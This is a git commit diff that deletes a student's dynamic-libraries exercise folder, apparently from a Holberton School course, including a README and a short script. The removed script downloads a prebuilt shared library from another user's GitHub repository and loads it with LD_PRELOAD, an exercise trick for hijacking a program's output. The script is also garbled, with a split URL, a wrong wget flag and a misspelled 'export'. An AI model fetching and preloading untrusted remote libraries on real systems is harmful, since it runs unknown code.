ddafb4e966e4295b82826348a57bbc10671ab4e4
Hephzibahbakre45 <122830190+Hephzibahbakre45@users.noreply.github.com>
2023-09-20 13:46:07 +0100

    Delete 0x18-dynamic_libraries directory

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++
@@ -1,6 +0,0 @@
-#!/bin/bash
-
-wget -p /tmp https://github.com/sidneyriffic/
-holbertonschool-low-level-programming/raw/
-master/0x18-dynamic_libraries/putshack.so
-expot LD_PRELOAD=/tmp/putshack.so
--- 0x18-dynamic_libraries/README.md
+++
@@ -1,1 +0,0 @@
- this directory is about learning what is dynamic library and how to create dynamics libraries on linus
